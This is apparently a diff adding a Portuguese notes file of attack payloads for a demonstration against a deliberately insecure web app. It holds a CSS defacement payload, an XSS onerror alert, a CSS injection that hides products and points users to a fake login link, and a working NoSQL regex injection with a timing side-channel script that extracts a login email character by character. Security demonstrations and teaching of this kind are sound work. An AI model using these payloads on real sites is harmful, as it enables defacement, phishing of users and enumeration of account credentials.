@@ -1,0 +1,83 @@
+projeto inseguro: https://apiinjection-dev-8cwcq9.azurewebsites.net/
+
+
+
+Pay
+ loader: agressivo: <style> body::after { content: "SITE HACKEADO"; 
+position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
+background-color: black; color: lime; font-size: 50px; text-align: 
+center; padding-top: 20vh; z-index: 9999; } </style> (Usar no 
+final da apresentação)
+
+Pop up: <img src="x" onerror="alert('Vulnerabilidade XSS Detetada na Aplicação!');">
+
+<img src="https://pbs.twimg.com/media/G85YFqzW8AAWmAm.jpg" style="width: 100%; height: 200px; object-fit: cover; border-radius: 8px; margin-top: 10px; display: block;">
+
+
+
+fetch('/api/auth/login', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    email: { "$regex": "^j" }, 
+    password: "senha_errada"
+  })
+}).then(() => console.log("Se demorou ~100ms, um email existe"));
+
+
+repo: https://github.com/ArthurGomes11/api-injection-test
+Você, 2 min
+play loader de captura: <style>
+  /* Esconde os produtos reais e mostra uma mensagem de 'Manutenção' */
+  .products-list { display: none; }
+  body::before { 
+    content: "⚠️ SESSÃO EXPIRADA. Por favor, faça login novamente no link: bit.ly/site-falso";
+    display: block; background: yellow; color: black; padding: 20px; font-weight: bold; text-align: center;
+  }
+</style>
+async function extrairDadosEstavel() {
+    const caracteres = "admin@loja.com123456789-_.";
+    let descoberto = "";
+    const tentativasPorLetra = 3; // Média para ignorar oscilações da rede
+    
+    console.log("%c🛡️ Iniciando Extração de Alta Precisão...", "color: white; background: #0078d4; padding: 5px;");
+
+    while (descoberto.length < 20) {
+        let resultados = [];
+
+        for (let char of caracteres) {
+            const teste = "^" + descoberto + char;
+            let somaTempos = 0;
+
+            for (let i = 0; i < tentativasPorLetra; i++) {
+                const t0 = performance.now();
+                await fetch('/api/auth/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: { "$regex": teste }, password: "x" })
+                });
+                somaTempos += (performance.now() - t0);
+            }
+
+            const media = somaTempos / tentativasPorLetra;
+            resultados.push({ char, media });
+        }
+
+        // A letra que tiver a maior média de tempo é a correta (devido ao bcrypt)
+        resultados.sort((a, b) => b.media - a.media);
+        
+        const vencedora = resultados[0];
+        
+        // Se a média for baixa demais, a extração acabou
+        if (vencedora.media < 60) break;
+
+        descoberto += vencedora.char;
+        console.log(%c[+] Confirmado: ${descoberto} (Média: ${Math.round(vencedora.media)}ms), "color: lime;");
+
+        if (descoberto === "admin@loja.com") break;
+    }
+
+    console.log("%c🎯 EXTRAÇÃO FINALIZADA: " + descoberto, "color: #ff00ff; font-size: 16px; font-weight: bold;");
+}
+
+extrairDadosEstavel();
